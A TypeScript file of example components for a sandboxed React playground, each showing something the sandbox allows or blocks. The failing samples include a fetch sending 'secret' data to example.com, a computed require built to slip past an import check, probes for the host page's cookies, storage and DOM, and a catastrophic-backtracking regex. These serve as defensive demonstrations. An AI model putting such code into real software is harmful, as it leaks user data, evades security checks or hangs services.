export type Example = {
  id: string
  label: string
  group: 'works' | 'fails'
  /** One line on what this example demonstrates. */
  explains: string
  code: string
}

export const EXAMPLES: Example[] = [
  {
    id: 'profile-card',
    group: 'works',
    explains: 'A component with a props contract, rendered in the sandbox.',
    label: 'Profile card',
    code: `import { useState } from 'react'
import { z } from 'zod'
import { Badge, Button, Card, Stack, Text } from '@kit/ui'

// The contract: validated before every render.
export const propsSchema = z.object({
  name: z.string().min(1),
  role: z.string(),
  skills: z.array(z.string()).max(5),
})

export const exampleProps = {
  name: 'Ada Lovelace',
  role: 'Engineer',
  skills: ['analysis', 'algorithms'],
}

type Props = z.infer<typeof propsSchema>

export default function ProfileCard({ name, role, skills }: Props) {
  const [following, setFollowing] = useState(false)

  return (
    <Card title={name}>
      <Stack gap={12}>
        <Text tone="muted">{role}</Text>
        <Stack direction="row" gap={6}>
          {skills.map((s) => <Badge key={s}>{s}</Badge>)}
        </Stack>
        <Stack direction="row" gap={8}>
          <Button variant={following ? 'ghost' : 'primary'} onClick={() => setFollowing(!following)}>
            {following ? 'Following' : 'Follow'}
          </Button>
          {following && <Badge tone="success">connected</Badge>}
        </Stack>
      </Stack>
    </Card>
  )
}
`,
  },
  {
    id: 'invalid-props',
    group: 'fails',
    explains: 'Props contract: invalid exampleProps are rejected before render. Edit them in the props panel.',
    label: 'Invalid props',
    code: `// exampleProps break the schema, so the component never renders
// with bad data. Edit them in the props panel to make it pass.
import { z } from 'zod'
import { Card, Text } from '@kit/ui'

export const propsSchema = z.object({
  title: z.string().min(1),
  rating: z.number().int().min(1).max(5),
  email: z.email(),
})

export const exampleProps = {
  title: '',
  rating: 7,
  email: 'not-an-email',
}

export default function Review({ title, rating, email }: z.infer<typeof propsSchema>) {
  return (
    <Card title={title}>
      <Text>{'★'.repeat(rating)}</Text>
      <Text tone="muted">{email}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'blocked-import',
    group: 'fails',
    explains: 'Import allowlist: the host rejects this before the code reaches the sandbox.',
    label: 'Disallowed import',
    code: `// Only react, zod and @kit/ui can be imported.
// This never reaches the sandbox: the host rejects it first.
import confetti from 'canvas-confetti'
import { Card, Text } from '@kit/ui'

export default function Party() {
  confetti()
  return (
    <Card title="Party">
      <Text>🎉</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'sneaky-require',
    group: 'fails',
    explains: "Import allowlist: a computed module name slips past the host scan, so the sandbox's require rejects it.",
    label: 'Dynamic require',
    code: `// Computing the module name hides it from the host's static check,
// so the sandbox's own require() rejects it at runtime.
import { Card, Text } from '@kit/ui'

const name = ['node', 'fs'].join(':')
const fs = require(name)

export default function Sneaky() {
  return (
    <Card title="Sneaky">
      <Text>{String(fs)}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'render-throw',
    label: 'Render error',
    group: 'fails',
    explains: 'Error boundary: a throw during render is caught inside the sandbox; the host keeps working.',
    code: `import { Card, Text } from '@kit/ui'

export const exampleProps = { user: null }

export default function Greeting({ user }: { user: { name: string } | null }) {
  // user is null, so this throws while rendering
  return (
    <Card title="Hello">
      <Text>{user!.name}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'handler-throw',
    label: 'Error in a click handler',
    group: 'fails',
    explains: 'Runtime errors: event handlers run outside render, so the sandbox reports them from window.onerror.',
    code: `import { Button, Card, Text } from '@kit/ui'

export default function Checkout() {
  return (
    <Card title="Checkout">
      <Text tone="muted">Renders fine. Click the button.</Text>
      <Button onClick={() => { throw new Error('Payment service is not configured') }}>
        Pay now
      </Button>
    </Card>
  )
}
`,
  },
  {
    id: 'infinite-loop',
    label: 'Infinite loop',
    group: 'fails',
    explains: 'Loop guard: every loop is instrumented and stops after 1s. The watchdog is the backstop for other hangs.',
    code: `import { Card, Text } from '@kit/ui'

export default function Spinner() {
  let ticks = 0
  while (true) {
    ticks++ // never ends
  }
  return (
    <Card title="Unreachable">
      <Text>{ticks}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'hang-without-loop',
    label: 'Hang without a loop',
    group: 'fails',
    explains: 'Watchdog: regex backtracking has no loop to guard, so the host restarts the frozen sandbox (Chromium isolates the frame; other browsers may freeze the tab for a few seconds).',
    code: `import { Card, Text } from '@kit/ui'

// Catastrophic backtracking: runs for minutes, with no loop in sight.
const evil = /^(a+)+$/
const input = 'a'.repeat(30) + '!'

export default function Validator() {
  const ok = evil.test(input)
  return (
    <Card title="Validator">
      <Text>{ok ? 'valid' : 'invalid'}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'network',
    label: 'Network request',
    group: 'fails',
    explains: 'CSP: connect-src \'none\' blocks fetch, XHR and WebSockets, so code can\'t send data anywhere.',
    code: `import { useEffect, useState } from 'react'
import { Badge, Card, Text } from '@kit/ui'

export default function Beacon() {
  const [result, setResult] = useState('sending…')

  useEffect(() => {
    fetch('https://example.com/collect?data=secret')
      .then(() => setResult('sent (this should never happen)'))
      .catch((err) => setResult('blocked: ' + err.message))
  }, [])

  return (
    <Card title="Beacon">
      <Text>{result}</Text>
      <Badge tone="warning">fetch</Badge>
    </Card>
  )
}
`,
  },
  {
    id: 'escape',
    label: 'Reach into the host page',
    group: 'fails',
    explains: "Opaque origin + sandbox flags: no access to the host's DOM, cookies or storage, and no navigating the top window.",
    code: `import { Card, Stack, Text } from '@kit/ui'

function attempt(label: string, fn: () => unknown) {
  try {
    return label + ': ' + String(fn())
  } catch (err) {
    return label + ': blocked (' + (err as Error).name + ')'
  }
}

export default function Escape() {
  const results = [
    attempt('parent DOM', () => window.parent.document.title),
    attempt('cookies', () => document.cookie),
    attempt('localStorage', () => localStorage.getItem('x')),
    attempt('top navigation', () => { window.top!.location.href = 'https://example.com'; return 'navigated?' }),
  ]
  return (
    <Card title="Escape attempts">
      <Stack gap={4}>{results.map((r) => <Text key={r}>{r}</Text>)}</Stack>
    </Card>
  )
}
`,
  },
]
